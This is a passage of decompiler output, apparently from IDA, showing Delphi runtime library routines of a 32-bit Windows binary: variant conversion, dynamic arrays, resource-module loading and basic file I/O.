  VARIANTARG pvargDest; // [esp+Ch] [ebp-10h] BYREF

  v3 = (unsigned __int16)pvarg;
  v6 = a3->vt - 256;
  if ( v6 )
  {
    if ( v6 == 1 )
    {
      result = System::_16723(pvarg, pvarSrc, a3);
    }
    else
    {
      result = (VARIANTARG *)sub_40417C(pvarg, pvarSrc, a3);
      if ( !(_BYTE)result )
      {
        result = (VARIANTARG *)VariantChangeTypeEx(a3, pvarSrc, 0x400u, 0, v3);
        if ( result )
          sub_404020();
      }
    }
  }
  else
  {
    result = (VARIANTARG *)sub_40417C(pvarg, pvarSrc, a3);
    if ( !(_BYTE)result )
    {
      pvargDest.vt = 0;
      if ( VariantChangeTypeEx(&pvargDest, pvarSrc, 0x400u, 0, v3) )
        sub_404020();
      System::__linkproc__ VarClear(v7, a3);
      *(_DWORD *)&a3->vt = *(_DWORD *)&pvargDest.vt;
      a3->lVal = pvargDest.lVal;
      result = (VARIANTARG *)pvargDest.cyVal.Hi;
      a3->cyVal.Hi = pvargDest.cyVal.Hi;
    }
  }
  return result;
}
// 4041E5: variable 'v7' is possibly undefined

//----- (00404238) --------------------------------------------------------
LONG __usercall Variants::_16474@<eax>(VARIANTARG *a1@<eax>, int a2@<edx>)
{
  VARIANTARG *v4; // ecx
  LONG result; // eax
  LONG v6; // [esp+4h] [ebp-4h] BYREF

  v6 = 0;
  System::OleStrToStrVar((System::AnsiString *)&v6, *(OLECHAR **)(a2 + 8));
  System::__linkproc__ VarClear(v4, a1);
  a1->vt = 256;
  result = v6;
  a1->lVal = v6;
  return result;
}
// 404251: variable 'v4' is possibly undefined

//----- (00404268) --------------------------------------------------------
void __usercall Variants::_16476(VARIANTARG *a1@<eax>, int a2@<edx>)
{
  WCHAR *v4; // esi
  VARIANTARG *v5; // ecx

  v4 = System::StringToOleStr(*(CHAR **)(a2 + 8));
  System::__linkproc__ VarClear(v5, a1);
  a1->vt = 8;
  a1->lVal = (LONG)v4;
}
// 404278: variable 'v5' is possibly undefined

//----- (00404288) --------------------------------------------------------
void __usercall __linkproc__ VarCast(VARIANTARG *vt@<ecx>, VARIANT *a2@<eax>, VARIANTARG *a3@<edx>)
{
  VARTYPE v3; // ax
  VARIANTARG *v4; // ebx
  VARIANTARG *v5; // ecx
  VARIANTARG *v6; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v7; // [esp-Ch] [ebp-24h] BYREF
  void *v8; // [esp-8h] [ebp-20h]
  VARIANTARG *v9; // [esp-4h] [ebp-1Ch]
  VARIANT *v10; // [esp+4h] [ebp-14h]
  VARIANTARG pvarSrc; // [esp+8h] [ebp-10h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v10 = a2;
  v3 = a3->vt;
  v4 = vt;
  if ( (_WORD)vt == a3->vt )
  {
    System::__linkproc__ VarCopy(vt, a3, v10);
  }
  else if ( v3 == 256 )
  {
    if ( (_WORD)vt == 8 )
    {
      Variants::_16476(v10, (int)a3);
    }
    else
    {
      pvarSrc.vt = 0;
      Variants::_16476(&pvarSrc, (int)a3);
      v9 = (VARIANTARG *)&savedregs;
      v8 = &loc_404301;
      v7 = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)&v7);
      System::_16725(v4, &pvarSrc, v10);
      v5 = v9;
      __writefsdword(0, (unsigned int)v7);
      v9 = (VARIANTARG *)&loc_404377;
      System::__linkproc__ VarClear(v5, &pvarSrc);
    }
  }
  else if ( (_WORD)vt != 256 || v3 == 257 )
  {
    System::_16725(vt, a3, v10);
  }
  else if ( v3 == 8 )
  {
    Variants::_16474(v10, (int)a3);
  }
  else
  {
    pvarSrc.vt = 0;
    LOWORD(vt) = 8;
    System::_16725(vt, a3, &pvarSrc);
    v9 = (VARIANTARG *)&savedregs;
    v8 = &loc_404366;
    v7 = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&v7);
    Variants::_16474(v10, (int)&pvarSrc);
    v6 = v9;
    __writefsdword(0, (unsigned int)v7);
    v9 = (VARIANTARG *)&loc_404377;
    System::__linkproc__ VarClear(v6, &pvarSrc);
  }
}

//----- (0040437C) --------------------------------------------------------
void __usercall System::__linkproc__ VarToLStr(char **a1@<eax>, VARIANTARG *a2@<edx>)
{
  LStr *v3; // ecx
  VARIANT v4; // [esp+0h] [ebp-14h] BYREF

  if ( a2->vt == 256 )
  {
    __linkproc__ LStrAsg(a1, a2->pcVal);
  }
  else
  {
    v4.vt = 0;
    __linkproc__ VarCast((VARIANTARG *)0x100, &v4, a2);
    System::__linkproc__ LStrClr(v3);
    *a1 = v4.pcVal;
  }
}
// 4043A5: variable 'v3' is possibly undefined

//----- (004043B8) --------------------------------------------------------
void __usercall __spoils<edx,ecx> sub_4043B8(VARIANTARG *a1@<eax>, VARIANTARG *a2@<ecx>)
{
  System::__linkproc__ VarClear(a2, a1);
}

//----- (004043C0) --------------------------------------------------------
// Borland Visual Component Library & Packages
// BDS 2005-2007 and Delphi6-7 Visual Component Library
VARIANT *__usercall System::__linkproc__ VarAddRef@<eax>(VARIANT *result@<eax>, VARIANT *a2@<ecx>)
{
  VARIANTARG v2; // [esp-10h] [ebp-10h] BYREF

  if ( result->vt >= 8u )
  {
    v2 = *result;
    result->vt = 0;
    result = System::__linkproc__ VarCopy(a2, &v2, result);
  }
  return result;
}

//----- (004043E4) --------------------------------------------------------
int __usercall sub_4043E4@<eax>(int result@<eax>)
{
  if ( result )
    result = *(_DWORD *)(result - 4);
  return result;
}

//----- (004043EC) --------------------------------------------------------
int __usercall sub_4043EC@<eax>(int a1@<eax>)
{
  return sub_4043E4(a1) - 1;
}

//----- (004043F4) --------------------------------------------------------
void __userpurge sub_4043F4(char **a1@<eax>, char **a2@<edx>, VARIANT *a3@<ecx>, int a4)
{
  System::__linkproc__ CopyArray(a1, a2, a3, a4);
}

//----- (0040440C) --------------------------------------------------------
// attributes: thunk
int *__usercall sub_40440C@<eax>(int *a1@<eax>, int a2@<edx>)
{
  return System::__linkproc__ DynArrayClear(a1, a2);
}

//----- (00404414) --------------------------------------------------------
int *__userpurge System::_16813@<eax>(int *a1@<eax>, int a2@<edx>, int a3@<ecx>, int *a4)
{
  int *v4; // ebx
  int v5; // edi
  int *result; // eax
  int *v7; // ebx
  int v8; // esi
  VARIANT **v9; // eax
  VARIANT *v10; // esi
  char *v11; // ebx
  int *v12; // ebx
  int v13; // ebx
  int v14; // edi
  int v15; // edi
  int *v16; // [esp+Ch] [ebp-20h] BYREF
  int v17; // [esp+10h] [ebp-1Ch]
  int v18; // [esp+14h] [ebp-18h]
  int v19; // [esp+18h] [ebp-14h]
  int v20; // [esp+1Ch] [ebp-10h]
  int v21; // [esp+20h] [ebp-Ch]
  int v22; // [esp+24h] [ebp-8h]
  int *v23; // [esp+28h] [ebp-4h]
  _DWORD *v24; // [esp+34h] [ebp+8h]

  v22 = a3;
  v23 = a1;
  v4 = (int *)*a1;
  v5 = *a4;
  if ( *a4 > 0 )
  {
    v20 = 0;
    if ( v4 )
    {
      v7 = v4 - 1;
      v20 = *v7;
      v4 = v7 - 1;
    }
    v8 = *(unsigned __int8 *)(a2 + 1) + a2;
    v18 = *(_DWORD *)(v8 + 2);
    v9 = *(VARIANT ***)(v8 + 6);
    if ( v9 )
      v10 = *v9;
    else
      v10 = 0;
    v17 = v18 * v5;
    if ( v18 * v5 / v5 != v18 )
      System::_16468(4);
    v17 += 8;
    if ( v4 && *v4 != 1 )
    {
      --*v4;
      v11 = (char *)sub_402598(v17);
      v19 = v20;
      if ( v5 < v20 )
        v19 = v5;
      if ( v10 )
      {
        sub_4028D4(v11 + 8, v18 * v19, 0);
        sub_4043F4((char **)v11 + 2, (char **)*v23, v10, v19);
      }
      else
      {
        Move((BYTE *)*v23, (BYTE *)v11 + 8, v18 * v19);
      }
    }
    else
    {
      v16 = v4;
      if ( v5 < v20 && v10 )
        System::__linkproc__ FinalizeArray(v20 - v5, v10);
      __linkproc__ ReallocMem((void **)&v16, v17);
      v11 = (char *)v16;
    }
    *(_DWORD *)v11 = 1;
    v12 = (int *)(v11 + 4);
    *v12 = v5;
    v13 = (int)(v12 + 1);
    sub_4028D4((char *)(v13 + v20 * v18), v18 * (v5 - v20), 0);
    if ( v22 > 1 )
    {
      v24 = a4 + 1;
      --v22;
      v14 = v5 - 1;
      if ( v14 >= 0 )
      {
        v15 = v14 + 1;
        v21 = 0;
        do
        {
          System::_16813(v24);
          ++v21;
          --v15;
        }
        while ( v15 );
      }
    }
    result = v23;
    *v23 = v13;
  }
  else
  {
    if ( v5 < 0 )
      System::_16468(4);
    result = sub_40440C(v23, a2);
  }
  return result;
}
// 404404: using guessed type int __fastcall System::__linkproc__ FinalizeArray(_DWORD, _DWORD);

//----- (004045A0) --------------------------------------------------------
int *__usercall sub_4045A0@<eax>(int *a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4)
{
  return System::_16813(a1, a2, a3, &a4);
}

//----- (004045AC) --------------------------------------------------------
int *__usercall System::__linkproc__ DynArrayClear@<eax>(int *result@<eax>, int a2@<edx>)
{
  int v2; // ecx
  OLECHAR **v3; // eax
  char **v4; // edx
  int v5; // ecx
  int *v6; // [esp-4h] [ebp-4h]

  v2 = *result;
  if ( *result )
  {
    *result = 0;
    if ( !_InterlockedDecrement((volatile signed __int32 *)(v2 - 8)) )
    {
      v6 = result;
      v3 = (OLECHAR **)v2;
      v4 = *(char ***)(a2 + *(unsigned __int8 *)(a2 + 1) + 6);
      if ( v4 )
      {
        v5 = *(_DWORD *)(v2 - 4);
        if ( v5 )
          v3 = System::__linkproc__ FinalizeArray(v3, *v4, v5);
      }
      sub_4025B0((int)(v3 - 2));
      result = v6;
    }
  }
  return result;
}

//----- (004045E8) --------------------------------------------------------
int *__usercall __linkproc__ DynArrayAsg@<eax>(int *result@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v3; // ebx
  int v4; // [esp-8h] [ebp-Ch]
  int *v5; // [esp-4h] [ebp-8h]

  v3 = *result;
  if ( a2 )
    _InterlockedIncrement((volatile signed __int32 *)(a2 - 8));
  if ( v3 && !_InterlockedDecrement((volatile signed __int32 *)(v3 - 8)) )
  {
    v5 = result;
    v4 = a2;
    ++*(_DWORD *)(v3 - 8);
    System::__linkproc__ DynArrayClear(result, a3);
    a2 = v4;
    result = v5;
  }
  *result = a2;
  return result;
}

//----- (00404610) --------------------------------------------------------
PVOID __usercall System::FindHInstance@<eax>(const void *a1@<eax>)
{
  PVOID result; // eax
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+0h] [ebp-1Ch] BYREF

  VirtualQuery(a1, &Buffer, 0x1Cu);
  if ( Buffer.State == 4096 )
    result = Buffer.AllocationBase;
  else
    result = 0;
  return result;
}

//----- (00404638) --------------------------------------------------------
// Borland Visual Component Library & Packages
int __usercall System::FindResourceHInstance@<eax>(int result@<eax>)
{
  _DWORD *v2; // edx

  v2 = (_DWORD *)dword_41C014;
  if ( dword_41C014 )
  {
    while ( result != v2[1] && result != v2[2] && result != v2[3] )
    {
      v2 = (_DWORD *)*v2;
      if ( !v2 )
        return result;
    }
    result = v2[4];
  }
  return result;
}
// 41C014: using guessed type int dword_41C014;

//----- (0040465C) --------------------------------------------------------
const CHAR *__usercall sub_40465C@<eax>(const CHAR *result@<eax>)
{
  while ( *result && *result != 92 )
    result = CharNextA(result);
  return result;
}

//----- (00404670) --------------------------------------------------------
int __usercall System::_16835@<eax>(CHAR *a1@<eax>)
{
  HMODULE v1; // eax
  const CHAR *v2; // eax
  const CHAR *v3; // ebx
  int v4; // esi
  const CHAR *v5; // edi
  HANDLE v6; // eax
  CHAR String2[261]; // [esp+Dh] [ebp-24Fh] BYREF
  char FindFileData[322]; // [esp+112h] [ebp-14Ah] BYREF
  CHAR *v10; // [esp+254h] [ebp-8h]
  LPSTR lpString1; // [esp+258h] [ebp-4h]

  lpString1 = a1;
  v10 = a1;
  v1 = GetModuleHandleA("kernel32.dll");
  if ( v1 )
  {
    *(_DWORD *)&FindFileData[318] = GetProcAddress(v1, "GetLongPathNameA");
    if ( *(_DWORD *)&FindFileData[318] )
    {
      if ( (*(int (__stdcall **)(LPSTR, CHAR *, int))&FindFileData[318])(lpString1, String2, 261) )
      {
LABEL_16:
        lstrcpyA(lpString1, String2);
        return (int)v10;
      }
    }
  }
  if ( *lpString1 != 92 )
  {
    v3 = lpString1 + 2;
    goto LABEL_10;
  }
  if ( lpString1[1] == 92 )
  {
    v2 = sub_40465C(lpString1 + 2);
    if ( *v2 )
    {
      v3 = sub_40465C(v2 + 1);
      if ( *v3 )
      {
LABEL_10:
        v4 = v3 - lpString1;
        lstrcpynA(String2, lpString1, v3 - lpString1 + 1);
        while ( *v3 )
        {
          v5 = sub_40465C(v3 + 1);
          if ( v4 + v5 - v3 + 1 > 261 )
            return (int)v10;
          lstrcpynA(&String2[v4], v3, v5 - v3 + 1);
          v6 = FindFirstFileA(String2, (LPWIN32_FIND_DATAA)FindFileData);
          if ( v6 == (HANDLE)-1 )
            return (int)v10;
          FindClose(v6);
          if ( v4 + 1 + lstrlenA(&FindFileData[44]) + 1 > 261 )
            return (int)v10;
          String2[v4] = 92;
          lstrcpyA(&String2[v4 + 1], &FindFileData[44]);
          v4 += lstrlenA(&FindFileData[44]) + 1;
          v3 = v5;
        }
        goto LABEL_16;
      }
    }
  }
  return (int)v10;
}

//----- (00404818) --------------------------------------------------------
HMODULE __usercall System::LoadResourceModule@<eax>(const CHAR *a1@<eax>)
{
  const CHAR *v2; // eax
  LCID v3; // eax
  HMODULE v4; // esi
  CHAR *i; // ebx
  CHAR *v6; // ebx
  unsigned int v8; // [esp-Ch] [ebp-134h] BYREF
  LPSTR v9; // [esp-8h] [ebp-130h]
  int v10; // [esp-4h] [ebp-12Ch]
  CHAR Filename[261]; // [esp+Bh] [ebp-11Dh] BYREF
  DWORD cbData; // [esp+110h] [ebp-18h] BYREF
  BYTE Data[5]; // [esp+116h] [ebp-12h] BYREF
  CHAR LCData[5]; // [esp+11Bh] [ebp-Dh] BYREF
  HKEY phkResult; // [esp+120h] [ebp-8h] BYREF
  LPCSTR lpString2; // [esp+124h] [ebp-4h]
  int savedregs; // [esp+128h] [ebp+0h] BYREF

  lpString2 = a1;
  GetModuleFileNameA(0, Filename, 0x105u);
  Data[0] = 0;
  if ( !RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Borland\\Locales", 0, 0xF003Fu, &phkResult)
    || !RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Borland\\Delphi\\Locales", 0, 0xF003Fu, &phkResult) )
  {
    v10 = (int)&savedregs;
    v9 = (LPSTR)&loc_4048E4;
    v8 = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&v8);
    cbData = 5;
    v2 = (const CHAR *)System::_16835(Filename);
    if ( RegQueryValueExA(phkResult, v2, 0, 0, Data, &cbData) )
      RegQueryValueExA(phkResult, byte_404A10, 0, 0, Data, &cbData);
    __writefsdword(0, v8);
    v10 = (int)&loc_4048EB;
    RegCloseKey(phkResult);
  }
  lstrcpyA(Filename, lpString2);
  v10 = 5;
  v9 = LCData;
  v8 = 3;
  v3 = GetThreadLocale();
  GetLocaleInfoA(v3, v8, v9, v10);
  v4 = 0;
  if ( Filename[0] && (LCData[0] || Data[0]) )
  {
    for ( i = &Filename[lstrlenA(Filename)]; *i != 46 && i != Filename; --i )
      ;
    if ( i != Filename )
    {
      v6 = i + 1;
      if ( Data[0] )
      {
        lstrcpyA(v6, (LPCSTR)Data);
        v4 = LoadLibraryExA(Filename, 0, 2u);
      }
      if ( !v4 )
      {
        if ( LCData[0] )
        {
          lstrcpyA(v6, LCData);
          v4 = LoadLibraryExA(Filename, 0, 2u);
          if ( !v4 )
          {
            LCData[2] = 0;
            lstrcpyA(v6, LCData);
            v4 = LoadLibraryExA(Filename, 0, 2u);
          }
        }
      }
    }
  }
  return v4;
}

//----- (00404A14) --------------------------------------------------------
// attributes: thunk
_DWORD *__usercall sub_404A14@<eax>(int a1@<eax>)
{
  return sub_404A24(a1);
}

//----- (00404A1C) --------------------------------------------------------
// attributes: thunk
int __usercall sub_404A1C@<eax>(int a1@<eax>)
{
  return System::RemoveModuleUnloadProc(a1);
}

//----- (00404A24) --------------------------------------------------------
_DWORD *__usercall sub_404A24@<eax>(int a1@<eax>)
{
  _DWORD *result; // eax

  result = (_DWORD *)sub_402598(8);
  *result = dword_41C018;
  result[1] = a1;
  dword_41C018 = (int)result;
  return result;
}
// 41C018: using guessed type int dword_41C018;

//----- (00404A44) --------------------------------------------------------
int __usercall System::RemoveModuleUnloadProc@<eax>(int result@<eax>)
{
  int v2; // esi
  _DWORD **v3; // edx
  _DWORD *v4; // ecx

  v2 = dword_41C018;
  if ( dword_41C018 && *(_DWORD *)(dword_41C018 + 4) == result )
  {
    dword_41C018 = *(_DWORD *)dword_41C018;
    result = sub_4025B0(v2);
  }
  else
  {
    v3 = (_DWORD **)dword_41C018;
    if ( dword_41C018 )
    {
      while ( 1 )
      {
        v4 = *v3;
        if ( *v3 )
        {
          if ( v4[1] == result )
            break;
        }
        v3 = (_DWORD **)*v3;
        if ( !v3 )
          return result;
      }
      *v3 = (_DWORD *)*v4;
      result = sub_4025B0((int)v4);
    }
  }
  return result;
}
// 41C018: using guessed type int dword_41C018;

//----- (00404AA4) --------------------------------------------------------
// BDS 2005-2007 and Delphi6-7 Visual Component Library
int __usercall System::_16845_0@<eax>(int a1@<eax>)
{
  int result; // eax
  unsigned int v2[6]; // [esp-Ch] [ebp-20h] BYREF
  int i; // [esp+Ch] [ebp-8h]
  int v4; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v4 = a1;
  result = dword_41C018;
  for ( i = dword_41C018; i; i = *(_DWORD *)i )
  {
    v2[2] = (unsigned int)&savedregs;
    v2[1] = (unsigned int)&loc_404ADF;
    v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v2);
    (*(void (__cdecl **)(unsigned int, void *, int *))(i + 4))(v2[0], &loc_404ADF, &savedregs);
    __writefsdword(0, v2[0]);
    result = *(_DWORD *)i;
  }
  return result;
}
// 41C018: using guessed type int dword_41C018;

//----- (00404B00) --------------------------------------------------------
_DWORD *__usercall sub_404B00@<eax>(_DWORD *result@<eax>)
{
  *result = dword_41C014;
  dword_41C014 = (int)result;
  return result;
}
// 41C014: using guessed type int dword_41C014;

//----- (00404B10) --------------------------------------------------------
_DWORD *__usercall System::UnregisterModule@<eax>(_DWORD *a1@<eax>)
{
  _DWORD *result; // eax
  unsigned int v2[2]; // [esp-Ch] [ebp-10h] BYREF
  int *v3; // [esp-4h] [ebp-8h]
  _DWORD *v4; // [esp+0h] [ebp-4h]
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v4 = a1;
  v3 = &savedregs;
  v2[1] = (unsigned int)&loc_404B74;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  System::_16845_0(a1[1]);
  __writefsdword(0, v2[0]);
  v3 = (int *)&loc_404B7B;
  if ( v4 == (_DWORD *)dword_41C014 )
  {
    result = (_DWORD *)*v4;
    dword_41C014 = *v4;
  }
  else
  {
    result = (_DWORD *)dword_41C014;
    if ( dword_41C014 )
    {
      while ( (_DWORD *)*result != v4 )
      {
        result = (_DWORD *)*result;
        if ( !result )
          return result;
      }
      *result = *v4;
    }
  }
  return result;
}
// 41C014: using guessed type int dword_41C014;

//----- (00404B80) --------------------------------------------------------
void __usercall System::LoadResString(int a1@<eax>, BYTE **a2@<edx>)
{
  HINSTANCE v3; // eax
  int v4; // eax
  UINT v5; // [esp-Ch] [ebp-414h]
  CHAR Buffer[1032]; // [esp+0h] [ebp-408h] BYREF

  if ( a1 )
  {
    if ( *(int *)(a1 + 4) >= 0x10000 )
    {
      __linkproc__ LStrFromPChar_0(a2, *(BYTE **)(a1 + 4));
    }
    else
    {
      v5 = *(_DWORD *)(a1 + 4);
      v3 = (HINSTANCE)System::FindResourceHInstance(**(_DWORD **)a1);
      v4 = LoadStringA(v3, v5, Buffer, 1024);
      __linkproc__ LStrFromPCharLen(a2, (BYTE *)Buffer, v4);
    }
  }
}

//----- (00404BD8) --------------------------------------------------------
_DWORD *__usercall sub_404BD8@<eax>(_DWORD *result@<eax>)
{
  int v1; // edx
  _DWORD *v2; // [esp-4h] [ebp-4h]

  v1 = *result;
  if ( *result )
  {
    *result = 0;
    v2 = result;
    (*(void (__stdcall **)(int))(*(_DWORD *)v1 + 8))(v1);
    result = v2;
  }
  return result;
}

//----- (00404BF0) --------------------------------------------------------
int *__usercall sub_404BF0@<eax>(int *result@<eax>, int a2@<edx>)
{
  int v2; // ecx
  int v3; // [esp-4h] [ebp-4h]

  v2 = *result;
  *result = a2;
  if ( a2 )
  {
    v3 = v2;
    result = (int *)(*(int (__stdcall **)(int))(*(_DWORD *)a2 + 4))(a2);
    v2 = v3;
  }
  if ( v2 )
    result = (int *)(*(int (__stdcall **)(int))(*(_DWORD *)v2 + 8))(v2);
  return result;
}

//----- (00404C14) --------------------------------------------------------
DWORD __usercall sub_404C14@<eax>(int a1@<eax>)
{
  DWORD result; // eax

  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 12) = 0;
  if ( ReadFile(*(HANDLE *)a1, *(LPVOID *)(a1 + 20), *(_DWORD *)(a1 + 8), (LPDWORD)(a1 + 16), 0)
    || (result = GetLastError(), result == 109) )
  {
    result = 0;
  }
  return result;
}

//----- (00404C40) --------------------------------------------------------
int sub_404C40()
{
  return 0;
}

//----- (00404C43) --------------------------------------------------------
DWORD __usercall sub_404C43@<eax>(int a1@<eax>, DWORD a2@<ecx>)
{
  signed int v2; // edx
  DWORD result; // eax
  DWORD NumberOfBytesWritten; // [esp+0h] [ebp-4h] BYREF

  NumberOfBytesWritten = a2;
  v2 = *(_DWORD *)(a1 + 12);
  if ( v2 <= 0
    || (*(_DWORD *)(a1 + 12) = 0, WriteFile(*(HANDLE *)a1, *(LPCVOID *)(a1 + 20), v2, &NumberOfBytesWritten, 0)) )
  {
    result = 0;
  }
  else
  {
    result = GetLastError();
  }
  return result;
}

//----- (00404C70) --------------------------------------------------------
DWORD __usercall sub_404C70@<eax>(int a1@<eax>)
{
  DWORD result; // eax
  void *v2; // [esp-4h] [ebp-4h]

  v2 = *(void **)a1;
  *(_DWORD *)(a1 + 4) = 55216;
  result = CloseHandle(v2) - 1;
  if ( result )
    result = GetLastError();
  return result;
}

//----- (00404C88) --------------------------------------------------------
DWORD __usercall sub_404C88@<eax>(int a1@<eax>)
{
  int v2; // eax
  int v3; // eax
  DWORD result; // eax
  DWORD v5; // eax
  DWORD v6; // ecx
  HANDLE v7; // eax
  DWORD v8; // eax
  bool v9; // cf
  LONG v10; // eax
  unsigned int i; // eax
  HANDLE v12; // eax
  DWORD v13; // eax
  DWORD v14; // [esp-4h] [ebp-8h] BYREF

  *(_DWORD *)(a1 + 12) = 0;
  *(_DWORD *)(a1 + 16) = 0;
  v2 = *(_DWORD *)(a1 + 4) - 55217;
  if ( !v2 )
  {
    v5 = 0x80000000;
    v6 = 3;
    *(_DWORD *)(a1 + 28) = sub_404C14;
    goto LABEL_9;
  }
  v3 = v2 - 1;
  if ( !v3 )
  {
    v5 = 0x40000000;
    v6 = 2;
LABEL_8:
    *(_DWORD *)(a1 + 28) = sub_404C43;
LABEL_9:
    *(_DWORD *)(a1 + 36) = sub_404C70;
    *(_DWORD *)(a1 + 32) = sub_404C40;
    if ( *(_BYTE *)(a1 + 72) )
    {
      v7 = CreateFileA((LPCSTR)(a1 + 72), v5, 1u, 0, v6, 0x80u, 0);
      if ( v7 != (HANDLE)-1 )
      {
        *(_DWORD *)a1 = v7;
        if ( *(_DWORD *)(a1 + 4) != 55219 )
          goto LABEL_29;
        --*(_DWORD *)(a1 + 4);
        v8 = GetFileSize(*(HANDLE *)a1, 0) + 1;
        if ( v8 )
        {
          v9 = v8 < 0x81;
          v10 = v8 - 129;
          if ( v9 )
            v10 = 0;
          if ( SetFilePointer(*(HANDLE *)a1, v10, 0, 0) != -1 )
          {
            v14 = 0;
            if ( ReadFile(*(HANDLE *)a1, (LPVOID)(a1 + 332), 0x80u, &v14, 0) )
            {
              for ( i = 0; i < v14; ++i )
              {
                if ( *(_BYTE *)(a1 + i + 332) == 26 )
                {
                  if ( SetFilePointer(*(HANDLE *)a1, i - v14, 0, 2u) == -1 || !SetEndOfFile(*(HANDLE *)a1) )
                    goto LABEL_35;
                  break;
                }
              }
LABEL_29:
              if ( *(_DWORD *)(a1 + 4) != 55217 )
              {
                v13 = GetFileType(*(HANDLE *)a1);
                if ( !v13 )
                {
                  CloseHandle(*(HANDLE *)a1);
                  *(_DWORD *)(a1 + 4) = 55216;
                  return 105;
                }
                if ( v13 == 2 )
                  *(_DWORD *)(a1 + 32) = sub_404C43;
              }
              return 0;
            }
          }
        }
      }
    }
    else
    {
      *(_DWORD *)(a1 + 36) = sub_404C40;
      if ( *(_DWORD *)(a1 + 4) == 55218 )
        v14 = -11;
      else
        v14 = -10;
      v12 = GetStdHandle(v14);
      if ( v12 != (HANDLE)-1 )
      {
        *(_DWORD *)a1 = v12;
        goto LABEL_29;
      }
    }
LABEL_35:
    *(_DWORD *)(a1 + 4) = 55216;
    return GetLastError();
  }
  result = v3 - 1;
  if ( !result )
  {
    v5 = -1073741824;
    v6 = 3;
    goto LABEL_8;
  }
  return result;
}

//----- (00404E16) --------------------------------------------------------
_BYTE *__usercall System::__linkproc__ Assign@<eax>(_DWORD *a1@<eax>, char *a2@<edx>)
{
  _BYTE *result; // eax
  char v3; // ch
  char v4; // cl
  char *v5; // edx
  char v6; // cl

  a1[5] = a1 + 83;
  *a1 = 0;
  a1[1] = 55216;
  a1[2] = 128;
  a1[3] = 0;
  a1[4] = 0;
  a1[6] = sub_404C88;
  a1[7] = 0;
  a1[8] = 0;
  a1[9] = 0;
  result = a1 + 18;
  if ( a2 )
  {
    v3 = -126;
    while ( 1 )
    {
      v4 = *a2;
      v5 = a2 + 1;
      *result++ = v4;
      if ( !v4 )
        break;
      v6 = *v5;
      a2 = v5 + 1;
      *result++ = v6;
      if ( !v6 )
        break;
      if ( !--v3 )
      {
        --result;
        goto LABEL_7;
      }
    }
  }
  else
  {
LABEL_7:
    *result = 0;
  }
  return result;
}

//----- (00404EB8) --------------------------------------------------------
DWORD __userpurge sub_404EB8@<eax>(int a1@<eax>, void *a2@<edx>, int a3@<ecx>, DWORD *a4)
{
  DWORD result; // eax
  int v6; // eax
  DWORD v7; // [esp-8h] [ebp-10h] BYREF
  int v8; // [esp-4h] [ebp-Ch]

  if ( (unsigned int)(*(_DWORD *)(a1 + 4) - 55217) > 2 )
  {
    v6 = 103;
    goto LABEL_9;
  }
  v8 = a3;
  v7 = 0;
  if ( !ReadFile(*(HANDLE *)a1, a2, a3 * *(_DWORD *)(a1 + 8), &v7, 0) )
  {
    v6 = GetLastError();
    goto LABEL_9;
  }
  result = v7 / *(_DWORD *)(a1 + 8);
  if ( a4 )
  {
    *a4 = result;
    return result;
  }
  if ( result != v8 )
  {
    v6 = 100;
LABEL_9:
    sub_40267C(v6);
    result = 0;
  }
  return result;
}

//----- (00404F1C) --------------------------------------------------------
DWORD __userpurge sub_404F1C@<eax>(int a1@<eax>, const void *a2@<edx>, int a3@<ecx>, DWORD *a4)
{
  DWORD result; // eax
  int v6; // eax
  DWORD v7; // [esp-8h] [ebp-10h] BYREF
  int v8; // [esp-4h] [ebp-Ch]

  if ( (unsigned int)(*(_DWORD *)(a1 + 4) - 55218) > 1 )
  {
    v6 = 103;
    goto LABEL_9;
  }
  v8 = a3;
  v7 = 0;
  if ( !WriteFile(*(HANDLE *)a1, a2, a3 * *(_DWORD *)(a1 + 8), &v7, 0) )
  {
    v6 = GetLastError();
    goto LABEL_9;
  }
  result = v7 / *(_DWORD *)(a1 + 8);
  if ( a4 )
  {
    *a4 = result;
    return result;
  }
  if ( result != v8 )
  {
    v6 = 101;
LABEL_9:
    sub_40267C(v6);
    result = 0;
  }
  return result;
}

//----- (00404F80) --------------------------------------------------------
int __usercall CLOSE@<eax>(int result@<eax>)
{
  int v1; // ebx

  v1 = result;
  if ( *(_DWORD *)(result + 4) == 55217 )
  {
LABEL_4:
    result = (*(int (**)(void))(v1 + 36))();
    if ( !result )
      return result;
    return (int)sub_40267C(result);
  }
  if ( (unsigned int)(*(_DWORD *)(result + 4) - 55217) <= 2 )
  {
    result = (*(int (**)(void))(result + 28))();
    if ( result )
      return (int)sub_40267C(result);
    goto LABEL_4;
  }
  if ( (_DWORD *)result != dword_41E048 )
  {
    result = 103;
    return (int)sub_40267C(result);
  }
  return result;
}

//----- (00404FBC) --------------------------------------------------------
_DWORD *__usercall sub_404FBC@<eax>(int a1@<eax>, int a2@<edx>)
{
  _DWORD *result; // eax

  if ( *(_DWORD *)(a1 + 4) != 55216 )
  {
    if ( (unsigned int)(*(_DWORD *)(a1 + 4) - 55216) > 3 )
      return sub_40267C(102);
    CLOSE(a1);
  }
  *(_DWORD *)(a1 + 4) = a2;
  result = (_DWORD *)(*(int (**)(void))(a1 + 24))();
  if ( result )
    result = sub_40267C((int)result);
  return result;
}

//----- (00404FFE) --------------------------------------------------------
_DWORD *__usercall sub_404FFE@<eax>(int a1@<eax>)
{
  return sub_404FBC(a1, 55218);
}

//----- (00405005) --------------------------------------------------------
_DWORD *__usercall sub_405005@<eax>(int a1@<eax>)
{
  return sub_404FBC(a1, 55219);
}

//----- (0040500C) --------------------------------------------------------
_DWORD *__usercall sub_40500C@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
